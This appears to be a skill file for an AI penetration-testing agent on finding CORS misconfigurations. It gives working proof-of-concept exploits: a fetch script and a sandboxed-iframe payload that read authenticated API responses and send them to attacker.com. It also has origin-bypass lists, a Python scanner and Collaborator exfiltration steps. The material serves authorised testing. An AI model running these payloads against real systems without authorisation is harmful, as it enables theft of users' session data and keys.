---
name: cors
description: CORS misconfiguration testing - arbitrary origin reflection, null origin, regex bypass, subdomain trust, credentials exfiltration
---

# CORS Misconfiguration

Cross-Origin Resource Sharing misconfigurations allow attacker-controlled origins to read sensitive cross-origin responses. The most critical combination is `Access-Control-Allow-Origin: attacker.com` paired with `Access-Control-Allow-Credentials: true` — enabling full session-authenticated data theft.

## Key Headers

```
Access-Control-Allow-Origin: https://attacker.com   # reflected from Origin
Access-Control-Allow-Credentials: true              # cookies/tokens included
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization
```

The critical attack path: `ACAO: <attacker>` + `ACAC: true` → steal authenticated API responses.

## Vulnerability Classes

### 1. Arbitrary Origin Reflection

Server blindly echoes the `Origin` header back:

```
Request:
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
{"username":"admin","email":"admin@corp.com","apiKey":"sk-..."}
```

PoC exploit:
```html
<!-- hosted on attacker.com -->
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
```

### 2. Null Origin

Server trusts `Origin: null` (sent by sandboxed iframes, file:// pages, data: URIs):

```
Request:
GET /api/data HTTP/1.1
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Exploit via sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    fetch('https://target.com/api/profile', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>location='https://attacker.com/?data='+btoa(d))
  </script>">
</iframe>
```

### 3. Regex / String Matching Bypass

Server validates origin with flawed regex:

```python
# Flawed: allows any prefix on target.com
if re.match(r'https?://.*target\.com', origin):   # missing $ anchor
    response['ACAO'] = origin

# Bypasses:
Origin: https://attacker.com?target.com     # query string
Origin: https://attacker.target.com         # subdomain
Origin: https://attackertarget.com          # no dot escaped
```

```python
# Missing prefix anchor:
if 'target.com' in origin:
# Bypasses:
Origin: https://attacker.com/target.com
Origin: https://target.com.attacker.com
```

Test by sending non-obvious origins:
```
Origin: https://target.com.attacker.com
Origin: https://attacker.com?target.com
Origin: https://attacker-target.com
Origin: https://target.com%60.attacker.com  # URL-encoded
```

### 4. Subdomain Trust

Server trusts all subdomains of the target:

```
Request:
Origin: https://subdomain.target.com

Response:
Access-Control-Allow-Origin: https://subdomain.target.com
Access-Control-Allow-Credentials: true
```

Attack path: find XSS on any subdomain → host CORS exploit on that subdomain → exfiltrate data using the trusted origin. Chain: XSS (sub.target.com) → CORS → API key theft.

### 5. Trusted Third-Party Domains

Developers trust CDN/analytics origins:

```
Trusted origins: *.cloudfront.net, *.s3.amazonaws.com
# If attacker can host content on these (e.g., public S3 bucket):
Origin: https://attacker-bucket.s3.amazonaws.com
→ ACAO: https://attacker-bucket.s3.amazonaws.com  # trusted!
```

## Systematic Testing Approach

```python
import requests

def test_cors(url, cookie):
    test_origins = [
        "https://attacker.com",
        "https://attacker.com?target.com",
        "null",
        f"https://{url.split('/')[2]}.attacker.com",
        f"https://attacker{url.split('/')[2]}",
    ]
    
    for origin in test_origins:
        r = requests.get(url, 
                         headers={"Origin": origin, "Cookie": cookie},
                         verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        
        if acao == origin or acao == "*":
            print(f"[!] CORS reflected: Origin={origin}")
            print(f"    ACAO: {acao}, ACAC: {acac}")
            if acac.lower() == "true" and acao != "*":
                print("    [CRITICAL] Credentials allowed with reflected origin!")
```

## Impact Classification

| ACAO | ACAC | Impact |
|------|------|--------|
| Reflected origin | true | Critical — full session theft |
| `*` | (ACAC ignored) | Medium — works only without credentials |
| Reflected origin | false/absent | Low — no creds, limited impact |
| null | true | High — sandboxed iframe attack |

## Validation Approach

1. Send `Origin: https://attacker.com` to all API endpoints while authenticated
2. Check if `ACAO` reflects the attacker origin AND `ACAC: true` is set
3. Write PoC: `fetch()` from attacker domain, `credentials:'include'`, exfil to Collaborator
4. Confirm via proxy: Collaborator receives stolen session data
5. Document: endpoint tested → proxy request ID → response headers + captured data

## Tools

- `corsy` — automated CORS misconfiguration scanner
- `cors-scanner` — Burp extension
- Manual `send_request` with crafted Origin headers
- Burp Collaborator — confirm data exfiltration
